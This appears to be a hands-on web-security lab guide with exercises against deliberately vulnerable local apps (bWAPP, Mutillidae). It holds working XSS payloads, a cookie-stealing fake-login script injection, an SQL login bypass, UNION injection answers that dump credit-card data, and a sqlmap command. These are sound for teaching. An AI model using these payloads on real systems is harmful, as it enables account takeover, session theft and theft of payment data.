# Basic: Insecure direct object reference {.container-fluid}
## 1) http://127.0.0.1/bWAPP/insecure_direct_object_ref_2.php
- Using [mitmproxy](http://127.0.0.1:8081), modify the request/response associated with the link above and figure out how to pay less (or nothing) for the tickets - or even get reimbursed!

## 2) http://127.0.0.1/bWAPP/smgmt_admin_portal.php
- Make sure security is set to low
- Look at the hint after visiting the page above and find out how to gain admin access
- Now set security to medium
- Use [mitmproxy](http://127.0.0.1:8081) to watch the traffic (requests and responses) and figure out how to gain admin access

# Basic: Injection {.container-fluid}
## 1) http://127.0.0.1/bWAPP/htmli_post.php
- Set security to low
- Using [mitmproxy](http://127.0.0.1:8081), inject simple HTML tags in the parameter values by following the steps below:
    * Watch the traffic generated by visiting the initial page, entering your name, and submitting the form. Notice that whatever you typed becomes visible on the page.
    * Now modify the applicable requests to inject some HTML tags. Notice the effect that has on the page.
      e.g., `<h1>Firstname</h1> and <u>Lastname</u>`

- Try some XSS!
`<script>alert('Hello!');</script>`

    ```
    XSS (Cross-site scripting) is an attack that allows for unauthorized modification of websites, theft of credentials and/or sessions, and many other scenarios depending on the web application. While these popups are conspicuous and harmless, a real attack would have real consequences and be invisible.
    ```

- Use XSS to look at your cookies. Cookies are a mechanism for the server to keep track of who's logged in.
`<script>alert(document.cookie);</script>`

## 2) http://127.0.0.1/mutillidae/index.php?page=login.php
- Click "Toggle Security" until it's set to "Client-side Security"
- Type a single quote (') in the password field and take a look at the error message that comes back. You will have to use Burp Suite to get around this.
- Using [mitmproxy](http://127.0.0.1:8081), bypass the client-side validation by intercepting a valid request (e.g., where the username and password are just letters), then modifying the values within the intercepted request so that your single quote is added to the password parameter. Take a look at the error now; it should be a raw error from the mysql database.

    ```
    Note this section of the error (this will vary if your single quote was in the username field):
    Query: SELECT * FROM accounts WHERE username='' AND password='''

    What you must do is ensure that the WHERE clause always be true. Try this in the username field (note the space after "--"):
    test' or 1=1; --

    With that, the query becomes:
    SELECT * FROM accounts WHERE username='test' or 1=1; -- ' AND password='''
    ```
    **Here's the trick: two dashes in SQL turn everything after them into a harmless comment, meaning the password check won't even execute!**
- You should be logged in as admin! Logout and try some others using Repeater (1=2, 'a'='a', etc.).


# Intermediate: Insecure direct object reference {.container-fluid}
## 1) http://127.0.0.1/mutillidae/robots.txt
- Take a look at the response from that page. Do you see anything interesting?

    ```
    This file, robots.txt, is used by many websites to handle how web crawlers (such as Google's indexing engine) will crawl them.
    Usually, it contains a list of directories where the crawler is not allowed to go - which immediately becomes a list of directories for attackers to visit! Let's take a look at the passwords directory.
    ```
- Visit the http://127.0.0.1/mutillidae/passwords/ page you found listed under `robots.txt` and open the containing `accounts.txt` file!

## 2) http://127.0.0.1/mutillidae/index.php?page=register.php
- Click "Toggle Security" until it's set to "Hosed"
- Create a new user account, then proceed to log in with that account.
- Using [mitmproxy](http://127.0.0.1:8081), intercept the login request.
- Forward the request, and look at the intercepted response.
- Try logging in as admin by modifying the "uid" cookie on the response.

# Intermediate: Injection {.container-fluid}
## 1) http://127.0.0.1/bWAPP/htmli_stored.php
- Before beginning, set security to low
- Post any comment you wish
- Using [mitmproxy](http://127.0.0.1:8081), find the response containing your comment. Take a look at the HTML table structure where your comment was added.
- Using HTML, try to impersonate another user by recreating the blog table structure

    ```
    I've created a script and fake login page that you can use to simulate an XSS attack for stealing someone's session cookie (if that cookie is not properly protected).
    Take a look at the script file (http://127.0.0.1/redirect.js). All it does is reset the victim's session, effectively logging them out, and then present a fake login page so they can "log back in". The error popup is just added for flavor.
    ```
- Inject the following payload as a blog comment:
  `Hello!<script src="http://127.0.0.1/redirect.js"></script>`
- You will see a (fake) pop-up page asking you to log in.

    ```
    Feel free to enter any credentials, but if you click the button, you will have to clear your browser cookies to be able to use the bWAPP site again on account of what the script does.
    However, if you do enter some credentials, you can see something cool (see next step).
    ```
- If this were a real attack, an attacker would have stolen the credentials, which would have been logged in the attacker's own web server logs. To see the logs:
    * Open a terminal (Win+R, then type "lxterminal" and hit enter)
    * Type: "sudo grep login= /var/log/apache2/access.log"
    * See the credentials you entered? This information could be on a remote, attacker-controlled server if this were a real attack.


# Challenge: Retrieve credit card numbers via SQL injection {.container-fluid}
## http://127.0.0.1/mutillidae/index.php?page=user-info.php

### Tips:
- The database table that the page is using has 7 columns (this is the reason for the 1,2,3,4,5,6,7 below)
- You can use `information_schema.tables` and `information_schema.columns` to gather information
- Using `where table_schema=database()` as a condition will restrict your results to the database being used by the application (rather than all DBs in the system)
- Use `concat(table_name)` and `concat(column_name)` to learn table/column names
- Start with this (note the space after "--"):
`' union select 1,2,3,4,5,6,7 from information_schema.tables where table_schema=database(); -- `

### Answers {#answers .collapse}
```
' union select 1,2,3,4,5,6,7 from information_schema.tables where table_schema=database(); --
' union select 1,concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database(); --
' union select 1,concat(table_name),concat(column_name),4,5,6,7 from information_schema.columns where table_name='credit_cards'; --
' union select 1,ccnumber,ccv,expiration,5,6,7 from credit_cards; --
```
Alternatively, you can use sqlmap to find that information nearly automatically. Just type the following command into a local terminal and keep hitting Enter for every prompt:
`sqlmap -r ~/.req --flush-session --fresh-queries --dbms mysql --technique U -p username -v 3 --search -T credit`

###
<button class="btn btn-danger" data-toggle="collapse" data-target="#answers">Show Answers</button>

